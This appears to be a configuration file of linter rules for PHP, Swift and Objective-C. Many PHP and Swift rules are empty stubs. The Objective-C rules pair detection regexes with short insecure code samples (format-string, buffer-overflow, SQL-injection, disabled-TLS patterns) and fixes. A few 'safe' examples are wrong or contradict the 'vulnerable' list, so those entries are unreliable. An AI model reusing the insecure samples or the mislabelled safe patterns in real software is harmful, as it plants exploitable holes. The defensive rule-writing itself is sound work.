  pattern: '[pattern]'
note: 'Insecure Deserialization - Magic Methods Abuse

  '

---
id: php-sec-014
language: php
severity: error
message: Session Fixation - Static Session ID
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Session Fixation - Static Session ID

  '

---
id: php-sec-015
language: php
severity: error
message: Session Security - Missing HttpOnly Flag
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Session Security - Missing HttpOnly Flag

  '

---
id: php-sec-016
language: php
severity: error
message: Session Security - Missing SameSite Attribute
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Session Security - Missing SameSite Attribute

  '

---
id: php-sec-017
language: php
severity: error
message: Weak Hashing - MD5 or SHA1 for Passwords
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Weak Hashing - MD5 or SHA1 for Passwords

  '

---
id: php-sec-018
language: php
severity: error
message: Weak Hashing - Hash Function Without Salt
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Weak Hashing - Hash Function Without Salt

  '

---
id: php-sec-019
language: php
severity: error
message: Weak Encryption - Hardcoded Encryption Keys
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Weak Encryption - Hardcoded Encryption Keys

  '

---
id: php-sec-021
language: php
severity: error
message: Authentication - Hardcoded Credentials
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Authentication - Hardcoded Credentials

  '

---
id: php-sec-022
language: php
severity: error
message: Authentication - Weak Login Check
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Authentication - Weak Login Check

  '

---
id: php-sec-023
language: php
severity: error
message: Authorization - Missing Access Control Checks
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Authorization - Missing Access Control Checks

  '

---
id: php-sec-024
language: php
severity: error
message: Unsafe Functions - eval() Usage
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Unsafe Functions - eval() Usage

  '

---
id: php-sec-025
language: php
severity: error
message: Unsafe Functions - assert() with Dynamic Code
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Unsafe Functions - assert() with Dynamic Code

  '

---
id: php-sec-026
language: php
severity: warning
message: Unsafe Functions - create_function() Deprecated
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Unsafe Functions - create_function() Deprecated

  '

---
id: php-perf-001
language: php
severity: error
message: String Concatenation in Loops
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'String Concatenation in Loops

  '

---
id: php-perf-003
language: php
severity: warning
message: Repeated str_replace() Calls
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Repeated str_replace() Calls

  '

---
id: php-perf-004
language: php
severity: warning
message: Inefficient Regular Expressions
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Inefficient Regular Expressions

  '

---
id: php-perf-005
language: php
severity: error
message: Inefficient Array Searches
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Inefficient Array Searches

  '

---
id: php-perf-006
language: php
severity: error
message: Multiple array_merge() in Loops
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Multiple array_merge() in Loops

  '

---
id: php-perf-007
language: php
severity: warning
message: Inefficient Array Filtering
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Inefficient Array Filtering

  '

---
id: php-perf-009
language: php
severity: error
message: N+1 Query Problem
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'N+1 Query Problem

  '

---
id: php-perf-010
language: php
severity: warning
message: SELECT * in Queries
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'SELECT * in Queries

  '

---
id: php-perf-012
language: php
severity: error
message: Unbounded Query Results
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Unbounded Query Results

  '

---
id: php-perf-013
language: php
severity: warning
message: Redundant require/include Statements
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Redundant require/include Statements

  '

---
id: php-perf-015
language: php
severity: error
message: OPcache Not Enabled or Configured
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'OPcache Not Enabled or Configured

  '

---
id: php-perf-017
language: php
severity: error
message: Processing Large Files in Memory
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Processing Large Files in Memory

  '

---
id: php-perf-018
language: php
severity: warning
message: Unnecessary Object Creation in Loops
tags:
- performance
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Unnecessary Object Creation in Loops

  '

---
id: php-qual-005
language: php
severity: info
message: Incorrect Naming Convention - Constants
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Incorrect Naming Convention - Constants

  '

---
id: php-qual-006
language: php
severity: error
message: Missing Parameter Type Hints
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Missing Parameter Type Hints

  '

---
id: php-qual-007
language: php
severity: error
message: Missing Return Type Declarations
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Missing Return Type Declarations

  '

---
id: php-qual-008
language: php
severity: warning
message: Missing Property Type Declarations
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Missing Property Type Declarations

  '

---
id: php-qual-009
language: php
severity: warning
message: Using Weak Type Juggling
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Using Weak Type Juggling

  '

---
id: php-qual-010
language: php
severity: error
message: Silent Error Suppression (@)
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Silent Error Suppression (@)

  '

---
id: php-qual-012
language: php
severity: warning
message: Bare Exception Catching
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Bare Exception Catching

  '

---
id: php-qual-013
language: php
severity: warning
message: Uninitialized Variables
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Uninitialized Variables

  '

---
id: php-qual-014
language: php
severity: warning
message: Missing PHPDoc Comments - Functions
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Missing PHPDoc Comments - Functions

  '

---
id: php-qual-015
language: php
severity: info
message: Missing PHPDoc Comments - Classes
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Missing PHPDoc Comments - Classes

  '

---
id: php-qual-016
language: php
severity: info
message: Incorrect PHPDoc Type Annotations
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Incorrect PHPDoc Type Annotations

  '

---
id: php-qual-017
language: php
severity: error
message: Missing Unit Tests
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Missing Unit Tests

  '

---
id: php-qual-019
language: php
severity: warning
message: Test Code Coverage Below Threshold
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Test Code Coverage Below Threshold

  '

---
id: php-qual-020
language: php
severity: warning
message: Cyclomatic Complexity Too High
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Cyclomatic Complexity Too High

  '

---
id: php-qual-021
language: php
severity: warning
message: Function Length Exceeded
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Function Length Exceeded

  '

---
id: php-qual-022
language: php
severity: warning
message: Too Many Parameters
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Too Many Parameters

  '

---
id: php-qual-023
language: php
severity: warning
message: Duplicate Code - Copy-Paste
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Duplicate Code - Copy-Paste

  '

---
id: php-qual-025
language: php
severity: error
message: Global Variables Usage
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Global Variables Usage

  '

---
id: php-qual-026
language: php
severity: info
message: Dead Code - Unused Functions/Variables
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Dead Code - Unused Functions/Variables

  '

---
id: php-qual-027
language: php
severity: warning
message: Large Classes - God Object
tags:
- quality
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Large Classes - God Object

  '

---
id: swift-sec-force-unwrap
tags:
- Security
severity: error
message: 'Quality: Avoid force unwrapping optionals'
note: '|'
language: swift

---
id: swift-sec-keychain-hardcoding
tags:
- Security
severity: error
message: 'Quality: Never hardcode keychain passwords or tokens'
note: '|'
language: swift

---
id: swift-sec-insecure-storage
tags:
- Security
severity: error
message: 'Quality: Avoid insecure storage of sensitive data'
note: '|'
language: swift

---
id: swift-sec-url-schemes
tags:
- Security
severity: error
message: 'Quality: Validate custom URL schemes and deep links'
note: '|'
language: swift

---
id: swift-sec-app-transport-security
tags:
- Security
severity: error
message: 'Quality: Enforce App Transport Security (ATS)'
note: '|'
language: swift

---
id: swift-sec-biometric-auth
tags:
- Security
severity: error
message: 'Quality: Validate biometric authentication properly'
note: '|'
language: swift

---
id: swift-sec-ssl-pinning
tags:
- Security
severity: error
message: 'Quality: Implement SSL/TLS certificate pinning for sensitive APIs'
note: '|'
language: swift

---
id: swift-sec-injection-attacks
tags:
- Security
severity: error
message: 'Quality: Prevent injection attacks (SQL, code, command)'
note: '|'
language: swift

---
id: swift-sec-memory-safety
tags:
- Security
severity: error
message: 'Quality: Maintain memory safety with proper pointer usage'
note: '|'
language: swift

---
id: swift-perf-value-vs-reference
tags:
- Performance
severity: warning
message: 'Quality: Choose appropriate value vs reference types'
note: '|'
language: swift

---
id: swift-perf-copy-on-write
tags:
- Performance
severity: warning
message: 'Quality: Leverage copy-on-write semantics for performance'
note: '|'
language: swift

---
id: swift-perf-arc-overhead
tags:
- Performance
severity: warning
message: 'Quality: Minimize Automatic Reference Counting (ARC) overhead'
note: '|'
language: swift

---
id: swift-perf-collection-operations
tags:
- Performance
severity: warning
message: 'Quality: Optimize collection operations for performance'
note: '|'
language: swift

---
id: swift-perf-lazy-properties
tags:
- Performance
severity: info
message: 'Quality: Use lazy properties for expensive initialization'
note: '|'
language: swift

---
id: swift-perf-inline-closures
tags:
- Performance
severity: info
message: 'Quality: Avoid capturing heavy objects in inline closures'
note: '|'
language: swift

---
id: swift-perf-avoid-string-concat
tags:
- Performance
severity: warning
message: 'Quality: Avoid string concatenation in loops'
note: '|'
language: swift

---
id: swift-perf-async-await-deadlock
tags:
- Performance
severity: error
message: 'Quality: Avoid deadlocks with async/await'
note: '|'
language: swift

---
id: swift-qual-naming-conventions
tags:
- Quality
severity: warning
message: 'Quality: Follow Swift naming conventions (PascalCase, camelCase)'
note: '|'
language: swift

---
id: swift-qual-optionals-usage
tags:
- Quality
severity: error
message: 'Quality: Use optionals correctly and safely'
note: '|'
language: swift

---
id: swift-qual-protocol-design
tags:
- Quality
severity: warning
message: 'Quality: Design protocols that are clear and maintainable'
note: '|'
language: swift

---
id: swift-qual-error-handling
tags:
- Quality
severity: error
message: 'Quality: Use proper error handling with typed errors'
note: '|'
language: swift

---
id: swift-qual-access-control
tags:
- Quality
severity: warning
message: 'Quality: Apply appropriate access control modifiers'
note: '|'
language: swift

---
id: swift-qual-documentation
tags:
- Quality
severity: warning
message: 'Quality: Document public APIs with DocC or inline comments'
note: '|'
language: swift

---
id: swift-qual-dependency-injection
tags:
- Quality
severity: warning
message: 'Quality: Use dependency injection to improve testability'
note: '|'
language: swift

---
id: swift-qual-testability
tags:
- Quality
severity: warning
message: 'Quality: Write code that is testable'
note: '|'
language: swift

---
id: swift-qual-type-safety
tags:
- Quality
severity: warning
message: 'Quality: Leverage Swift''s type safety'
note: '|'
language: swift

---
id: swift-qual-avoid-force-unwrap-general
tags:
- Quality
severity: error
message: 'Quality: Eliminate all force unwraps except in tests'
note: '"Comprehensive Swift security, performance, and quality rules"'
language: swift

---
id: objc-sec-001
name: Format String Vulnerability Detection
category: Security
severity: Critical
description: Detect format string vulnerabilities in NSString and NSLog calls
pattern: "(NSLog|NSString|stringWithFormat|stringByAppendingFormat|appendFormat|\n\
  \ initWithFormat|localizedStringWithFormat|stringWithCString|\n stringWithUTF8String).*%[a-zA-Z0-9@$]*\n"
check_type: format_string
vulnerable_patterns:
- NSLog(userInput)
- NSLog([dict description])
- '[NSString stringWithFormat:variable]'
- '[NSString localizedStringWithFormat:userString]'
safe_patterns:
- NSLog(@"%@", variable)
- '[NSString stringWithFormat:@"%@", variable]'
- 'NSLog(@"Static format: %@", value)'
recommendation: 'Always use format strings as literal constants, never from user input
  or variables.

  Pass user data as parameters to format specifiers:

  - NSLog(@"%@", userString) NOT NSLog(userString)

  - [NSString stringWithFormat:@"%@", value] NOT [NSString stringWithFormat:value]

  '
cwe:
- CWE-134
mitigation: Use %@ for objects, %d for integers, %f for floats. Validate all format
  strings.

---
id: objc-sec-002
name: Buffer Overflow Detection
category: Security
severity: Critical
description: Detect potential buffer overflow in C functions and char arrays
pattern: '(strcpy|strcat|sprintf|scanf|gets|fgets|memcpy|memmove|strncpy|strncat).*

  '
check_type: buffer_safety
vulnerable_patterns:
- strcpy(buffer, input)
- char buf[256]; strcpy(buf, userInput)
- sprintf(buffer, format, arg)
- char array[FIXED_SIZE]; memcpy(array, data, size)
- gets(buffer)
safe_patterns:
- strlcpy(buffer, input, sizeof(buffer))
- strncat(buffer, input, remaining)
- snprintf(buffer, sizeof(buffer), format, args)
- memset(buffer, 0, size); memcpy_s(buffer, size, data, min(size, dataLen))
recommendation: 'Use bounds-checked alternatives for string/memory operations:

  - Replace strcpy → strlcpy with explicit buffer size

  - Replace strcat → strlcat with explicit buffer size

  - Replace sprintf → snprintf with buffer size

  - Replace memcpy → use NS* equivalents or bounds checking

  - NEVER use gets() - always use fgets() with size limit

  - Use NSString for string handling when possible

  '
cwe:
- CWE-120
- CWE-119
mitigation: Validate buffer sizes, use safe variants, use NSString/NSData.

---
id: objc-sec-003
name: Keychain Security Issues
category: Security
severity: High
description: Detect insecure keychain usage and sensitive data handling
pattern: "(kSecClass|kSecAttrAccessible|kSecUseDataProtection|\n SecItemAdd|SecItemDelete|SecItemUpdate|SecItemCopyMatching|\n\
  \ SecKeyCreateSignature|SecKeyCreateDecryptedData).*\n"
check_type: keychain_security
vulnerable_patterns:
- 'kSecAttrAccessible: kSecAttrAccessibleAlways'
- 'kSecAttrAccessible: kSecAttrAccessibleWhenUnlocked'
- '[keychain storePassword:pwd user:u]'
- NSString *password = [NSString stringWithContentsOfFile:...]
- char password[256]; memcpy(password, data, len)
safe_patterns:
- 'kSecAttrAccessible: kSecAttrAccessibleWhenUnlockedThisDeviceOnly'
- 'kSecAttrAccessible: kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly'
- 'kSecUseDataProtection: @YES'
- 'kSecAttrSynchronizable: @NO'
- volatile char *sensitiveData; memset(sensitiveData, 0, len)
recommendation: 'Follow Apple Keychain best practices:

  - Use kSecAttrAccessibleWhenUnlockedThisDeviceOnly for maximum security

  - Set kSecAttrSynchronizable: @NO for passwords (disable iCloud Keychain)

  - Use kSecUseDataProtection: @YES for encrypted storage at rest

  - Use volatile for sensitive buffers and zero-fill on release

  - Never log passwords or sensitive data

  - Validate keychain error codes and handle failures gracefully

  - Use SecItemDelete to remove sensitive items when no longer needed

  '
cwe:
- CWE-922
- CWE-316
mitigation: Use ThisDeviceOnly, disable iCloud sync, zero-fill buffers, handle errors.

---
id: objc-sec-004
name: Insecure Data Storage Detection
category: Security
severity: High
description: Detect hardcoded credentials, insecure file storage, plaintext data
pattern: "(@\"password|@\"secret|@\"apikey|@\"token|@\"credential|\n NSUserDefaults|preferences|defaults|NSPropertyListSerialization|\n\
  \ [NSString writeToFile|[NSData writeToFile|NSSearchPathForDirectoriesInDomains|\n\
  \ NSDocumentDirectory|NSCachesDirectory|NSApplicationSupportDirectory).*\n"
check_type: data_storage
vulnerable_patterns:
- NSString *password = @"myPassword123"
- NSString *apiKey = @"sk-xyz123"
- '[defaults setObject:password forKey:@"pwd"]'
- '[NSKeyedArchiver archiveRootObject:userData toFile:path]'
- NSString *filePath = [docs stringByAppendingPathComponent:@"secrets.plist"]
- '[userData writeToFile:path atomically:YES]'
safe_patterns:
- // Credentials from environment or secure configuration
- '[keychain storePassword:pwd forService:@"app" account:user]'
- '[keychain retrievePasswordForService:@"app" account:user]'
- NSDataWritingFileProtectionComplete
- '[data writeToFile:path options:NSDataWritingFileProtectionComplete error:nil]'
recommendation: 'Never store sensitive data in code or NSUserDefaults:

  - Use Keychain for passwords, tokens, and credentials

  - Use Data Protection (NSDataWritingFileProtectionComplete) for files

  - Remove hardcoded secrets and use secure configuration

  - Encrypt sensitive files with CommonCrypto or CryptoKit

  - Use NSFileProtectionComplete for file permissions

  - Never log sensitive data

  - Clear sensitive data from memory (memset, zero-fill)

  '
cwe:
- CWE-798
- CWE-312
- CWE-315
mitigation: Use Keychain, Data Protection, encrypt files, remove hardcoded secrets.

---
id: objc-sec-005
name: SSL/TLS Configuration Issues
category: Security
severity: High
description: Detect weak SSL/TLS configuration and certificate validation
pattern: "(NSURLSessionConfiguration|URLSessionConfiguration|\n serverTrustPolicy|validateServerTrust|allowInvalidCertificates|\n\
  \ kCFStreamSSLValidatesCertificateChain|kCFStreamSSLLevel|\n SFSafariViewController|WKWebView|UIWebView).*\n"
check_type: ssl_tls
vulnerable_patterns:
- config.allowInvalidCertificates = YES
- challenge.sender useCredential:[NSURLCredential credentialForTrust:trust]
- 'kCFStreamSSLValidatesCertificateChain: NO'
- serverTrustPolicy = [AFNoSSLPinningServerTrustPolicy new]
- UIWebView loadRequest:request
safe_patterns:
- NSURLSessionConfiguration.default
- '[challenge.sender performDefaultHandlingForAuthenticationChallenge:challenge]'
- '[challenge.sender rejectProtectionSpaceAndContinueWithChallenge:challenge]'
- WKWebViewConfiguration with certificate pinning
- SFSafariViewController for external URLs
recommendation: 'Implement proper SSL/TLS security:

  - Use NSURLSession with default configuration

  - Implement certificate pinning for sensitive connections

  - Validate certificate chains and hostnames

  - Reject invalid certificates (do NOT set allowInvalidCertificates=YES)

  - Use WKWebView instead of deprecated UIWebView

  - Use SFSafariViewController for external URLs

  - Disable weak SSL versions (SSLv3, TLS 1.0, 1.1)

  - Test with network security configuration (networksecurity.xml on Android)

  '
cwe:
- CWE-295
mitigation: Enable certificate validation, implement pinning, reject invalid certs.

---
id: objc-sec-006
name: Memory Corruption Detection
category: Security
severity: Critical
description: Detect use-after-free, double-free, and memory safety issues
pattern: "(__weak|__strong|__autoreleasing|__unsafe_unretained|\n dealloc|release|autorelease|retain|copy|strong|weak|assign|\n\
  \ unsafe_unretained|NSZombieEnabled|MallocStackLogging).*\n"
check_type: memory_safety
vulnerable_patterns:
- Object *obj = ...; [obj release]; [obj method]
- __unsafe_unretained Object *obj = ...
- assign properties without __weak
- dealloc { [observer removeObserver:self] } // after object freed
- '[_array addObject:obj]; [obj release]'
safe_patterns:
- Object *obj = ... // ARC manages release
- '@property (weak, nonatomic) Object *obj'
- '@property (strong, nonatomic) Object *obj'
- '- (void)dealloc { [[NSNotificationCenter defaultCenter] removeObserver:self] }'
recommendation: 'Follow ARC and memory management best practices:

  - Use ARC - only manually manage in specific legacy code

  - Use __weak for delegates and observers to break retain cycles

  - Use __strong (default) for ownership

  - Implement dealloc to remove observers and clean up resources

  - Test with Zombie Objects and MallocStackLogging

  - Avoid __unsafe_unretained except in performance-critical code

  - Use tools: Instruments (Allocations, Leaks), AddressSanitizer

  '
cwe:
- CWE-416
- CWE-415
mitigation: Use ARC, __weak for delegates, implement dealloc, test with Instruments.

---
id: objc-sec-007
name: Injection Attack Detection
category: Security
severity: High
description: Detect SQL injection, predicate injection, and code injection
pattern: "(NSFetchRequest|predicate|predicateWithFormat|SQLiteDatabase|\n sqlite3_prepare|sqlite3_bind|executeQuery|NSPredicate|\n\
  \ NSCompoundPredicate|stringByAppendingString|stringByAppendingFormat).*\n"
check_type: injection
vulnerable_patterns:
- '[NSPredicate predicateWithFormat:userInput]'
- NSString *query = [NSString stringWithFormat:@"SELECT * FROM users WHERE id = %d",
  userId]
- NSFetchRequest *request = [NSFetchRequest fetchRequestWithEntityName:@"Entity"];
- request.predicate = [NSPredicate predicateWithFormat:@"name = %@", userInput]
- sqlite3_prepare_v2(db, query, -1, &stmt, NULL)
safe_patterns:
- '[NSPredicate predicateWithFormat:@"name = %@", userInput]'
- '[NSPredicate predicateWithFormat:@"age > %d", userAge]'
- sqlite3_prepare_v2(db, @"SELECT * FROM users WHERE id = ?", -1, &stmt, NULL)
- sqlite3_bind_int(stmt, 1, userId)
- request.predicate = [NSPredicate predicateWithFormat:@"status = %@", statusValue]
recommendation: 'Use parameterized queries and predicates:

  - Always use %@ for objects and %d for integers in predicates

  - Use bound parameters in SQL queries (? placeholders)

  - Never concatenate user input directly into predicates or queries

  - Validate and sanitize all user input before use

  - Use SQLite3 prepared statements instead of string formatting

  - Implement input validation for expected types and ranges

  - Log and monitor injection attempts

  '
cwe:
- CWE-89
- CWE-90
mitigation: Use parameterized queries, validate input, use bound parameters.

---
id: objc-sec-008
name: Unvalidated URL Handling
category: Security
severity: High
description: Detect unvalidated URL schemes and deep linking vulnerabilities
pattern: "(NSURL|openURL|canOpenURL|openAppSettings|openExternalURL|\n application:openURL:options|application:handleOpenURL|\n\
  \ URLScheme|universalLinks|handlesURL).*\n"
check_type: url_handling
vulnerable_patterns:
- '[[UIApplication sharedApplication] openURL:url]'
- if ([UIApplication.shared canOpenURL:url]) { [UIApplication.shared openURL:url]
  }
- NSURL *url = [NSURL URLWithString:userInput]
- '- (BOOL)application:(UIApplication *)app openURL:(NSURL *)url ...'
- '[UIApplication.shared openURL:url options:@{} completionHandler:nil]'
safe_patterns:
- NSURL *url = [NSURL URLWithString:@"https://example.com"]
- if (url && [url.scheme isEqualToString:@"https"]) { ... }
- if ([url.host isEqualToString:@"trusted.domain.com"]) { ... }
- '- (BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary
  *)options'
- '{ if ([self validateURL:url]) { ... } return NO; }'
recommendation: 'Implement secure URL handling:

  - Validate URL scheme (whitelist https, custom schemes)

  - Validate URL host against trusted domains

  - Check source of URLs (prevent open redirects)

  - Validate deep link parameters

  - Use URL parsing (components, query parameters)

  - Implement input validation for all URL-based navigation

  - Prevent open redirects by validating domains

  - Log suspicious URL handling attempts

  '
cwe:
- CWE-601
- CWE-941
mitigation: Validate schemes, hosts, and parameters. Prevent open redirects.

---
id: objc-sec-009
name: Weak Cryptography Detection
category: Security
severity: High
description: Detect weak encryption algorithms and cryptographic misuse
pattern: "(CCCrypt|SecKeyCreateSignature|SecKeyCreateDecryptedData|\n MD5|SHA1|DES|AES|CommonCrypto|SecCertificateRef|\n\
  \ kCCAlgorithmAES|kCCAlgorithmDES|CCAlgorithm|SecKeyAlgorithm).*\n"
check_type: cryptography
vulnerable_patterns:
- 'kCCAlgorithm: kCCAlgorithmDES'
- HMAC-SHA1
- MD5 hash for password storage
- SecKeyCreateSignature without proper algorithm
- CCCrypt(kCCEncryptionMode,kCCAlgorithmDES,...)
safe_patterns:
- 'kCCAlgorithm: kCCAlgorithmAES128'
- 'CCMode: kCCModeCBC with random IV'
- HMAC-SHA256
- 'SecKeyAlgorithm: kSecKeyAlgorithmRSASignatureMessagePKCS1v15SHA256'
- CryptoKit.SHA256.hash(data:)
recommendation: 'Use modern cryptographic practices:

  - Use AES-128 minimum (prefer AES-256) for encryption

  - Use SHA-256+ for hashing (avoid MD5, SHA1)

  - Use HMAC for message authentication

  - Use random IVs and secure key derivation (PBKDF2, bcrypt)

  - Use CryptoKit framework (modern, audited)

  - Avoid ECB mode (use CBC, CTR, GCM)

  - Use authenticated encryption (AES-GCM)

  - Never reuse IVs with same key

  '
cwe:
- CWE-327
mitigation: Use AES-256, SHA-256+, HMAC, CryptoKit, authenticated encryption.

---
id: objc-sec-010
name: Insecure Deserialization Detection
category: Security
severity: High
description: Detect unsafe deserialization of untrusted data
pattern: "(NSKeyedUnarchiver|NSPropertyListSerialization|JSONSerialization|\n NSCoding|NSSecureCoding|unarchiveObjectWithData|unarchiveTopLevelObjectWithData|\n\
  \ propertyListWithData|JSONObjectWithData|decode).*\n"
check_type: deserialization
vulnerable_patterns:
- '[NSKeyedUnarchiver unarchiveObjectWithData:untrustedData]'
- '[NSPropertyListSerialization propertyListWithData:data options:0 format:nil error:nil]'
- '[NSPropertyListSerialization propertyListWithData:data options:NSPropertyListImmutable
  format:nil error:nil]'
- unarchiveTopLevelObjectWithData:data error:nil
- '[NSJSONSerialization JSONObjectWithData:untrustedData options:0 error:nil]'
safe_patterns:
- '[NSKeyedUnarchiver unarchivedObjectOfClass:[MyClass class] fromData:data error:nil]'
- '[NSKeyedUnarchiver unarchiveTopLevelObjectWithData:data error:nil]'
- 'NSPropertyListSerialization:unarchivedObjectOfClass:forKey:fromData:error:'
- NSSecureCoding protocol implementation
- 'JSONDecoder().decode(MyClass.self, from: data)'
recommendation: 'Implement secure deserialization:

  - Use NSSecureCoding protocol instead of NSCoding

  - Use unarchivedObjectOfClass: to restrict types

  - Validate deserialized objects before use

  - Never deserialize from untrusted sources without validation

  - Use Codable/JSONDecoder for JSON (type-safe)

  - Implement NSSecureCoding.supportsSecureCoding = YES

  - Validate all deserialized data

  - Avoid PropertyList deserialization from untrusted sources

  '
cwe:
- CWE-502
mitigation: Use NSSecureCoding, restrict types, validate objects.

---
id: objc-sec-011
name: Path Traversal Detection
category: Security
severity: High
description: Detect path traversal and directory traversal vulnerabilities
pattern: "(NSFileManager|fileManager|NSDocumentDirectory|NSCachesDirectory|\n NSApplicationSupportDirectory|NSTemporaryDirectory|stringByAppendingPathComponent|\n\
  \ stringByAppendingString|NSSearchPathForDirectoriesInDomains|pathWithComponents).*\n"
check_type: path_traversal
vulnerable_patterns:
- NSString *basePath = NSSearchPathForDirectoriesInDomains(...)[0]
- NSString *filePath = [basePath stringByAppendingPathComponent:userInput]
- NSString *path = [NSString stringWithFormat:@"%@/%@", basePath, userPath]
- '[fileManager fileExistsAtPath:[basePath stringByAppendingString:path]]'
safe_patterns:
- NSString *basePath = NSSearchPathForDirectoriesInDomains(...)[0]
- if ([userInput containsString:@".."]) { return nil }
- NSString *filePath = [basePath stringByAppendingPathComponent:filename]
- if (![filePath hasPrefix:basePath]) { return nil }
recommendation: 'Prevent path traversal attacks:

  - Validate all file paths before accessing

  - Check that resolved path is within base directory

  - Reject paths containing \"..\" or absolute paths

  - Use stringByAppendingPathComponent: instead of string concatenation

  - Implement whitelist of allowed files/directories

  - Validate user input matches expected filename format

  - Use realpath() equivalent to resolve full path

  - Check file permissions and ownership

  '
cwe:
- CWE-22
mitigation: Validate paths, reject .., use stringByAppendingPathComponent:.

---
id: objc-sec-012
name: Weak Random Number Generation
category: Security
severity: High
description: Detect insecure random number generation for cryptography
pattern: "(random|arc4random|drand48|rand|srand|srandom|\n RAND_bytes|SecRandomCopyBytes|getRandomBytes).*\n"
check_type: rng
vulnerable_patterns:
- int token = arc4random() % 1000
- srand(time(NULL)); int random = rand()
- double random = drand48()
- srandom(seed); int value = random()
safe_patterns:
- SecRandomCopyBytes(kSecRandomDefault, sizeof(bytes), bytes)
- uint8_t bytes[32]; SecRandomCopyBytes(kSecRandomDefault, 32, bytes)
- CommonCrypto arc4random_buf
- CryptoKit.SecureBytes
recommendation: 'Use cryptographically secure random generation:

  - Use SecRandomCopyBytes for cryptographic randomness

  - Use arc4random_buf for secure random bytes

  - Never use random(), rand(), drand48() for security

  - Use secure sources: /dev/urandom, SecRandomDefault

  - For tokens: use 32+ bytes of secure random data

  - For nonces: use cryptographically secure generation

  - Test randomness with statistical analysis tools

  '
cwe:
- CWE-338
mitigation: Use SecRandomCopyBytes, arc4random_buf, not random/rand.

---
id: objc-sec-013
name: Null Pointer Dereference Detection
category: Security
severity: Medium
description: Detect potential null pointer dereferences and unsafe access
pattern: "(nil|NULL|NSNull|@try|@catch|guard|if.*nil|unwrap|\n if\\s*\\(\\s*\\!\\\
  s*\\w+\\s*\\)|if\\s*\\(\\w+.*==\\s*nil|if\\s*\\(\\w+.*!=\\s*nil).*\n"
check_type: null_safety
vulnerable_patterns:
- '[nilObject method]'
- NSString *str = [dict objectForKey:@"key"]; [str uppercaseString]
- '[array lastObject]'
- self.property.subproperty
- '[results firstObject].property'
safe_patterns:
- if (obj) { [obj method] }
- 'NSString *str = [dict objectForKey:@"key"] ?: @""'
- if (array.count > 0) { id last = array.lastObject }
- if (obj && obj.property) { ... }
recommendation: 'Implement safe null checking:

  - Always check for nil before accessing objects

  - Use optional chaining for property access

  - Use ?: operator for nil coalescing

  - Use guard statements to ensure objects exist

  - Implement nullability annotations (__nullable, __nonnull)

  - Use @try/@catch for exception handling

  - Test with nullability warnings enabled

  - Use _Nonnull in method signatures

  '
cwe:
- CWE-476
mitigation: 'Check for nil, use ?: operator, nullability annotations.'

---
id: objc-sec-014
name: Race Condition Detection
category: Security
severity: Medium
description: Detect potential race conditions in multi-threaded code
pattern: "(@synchronized|dispatch_async|dispatch_sync|dispatch_barrier|\n pthread_mutex|NSLock|NSRecursiveLock|NSConditionLock|\n\
  \ @property.*nonatomic|@property.*atomic|GCD|DispatchQueue).*\n"
check_type: race_condition
vulnerable_patterns:
- '@property (nonatomic) NSMutableArray *array'
- dispatch_async(queue, ^{ [self.array addObject:obj] })
- '[self.dict setObject:val forKey:key] // from multiple threads'
- '@property NSMutableDictionary *mutableDict // accessed from multiple threads'
safe_patterns:
- '@property (atomic) NSMutableArray *array'
- dispatch_barrier_async(queue, ^{ [self.array addObject:obj] })
- '@synchronized(self) { [self.array addObject:obj] }'
- NSLock *lock; [lock lock]; [self.array addObject:obj]; [lock unlock]
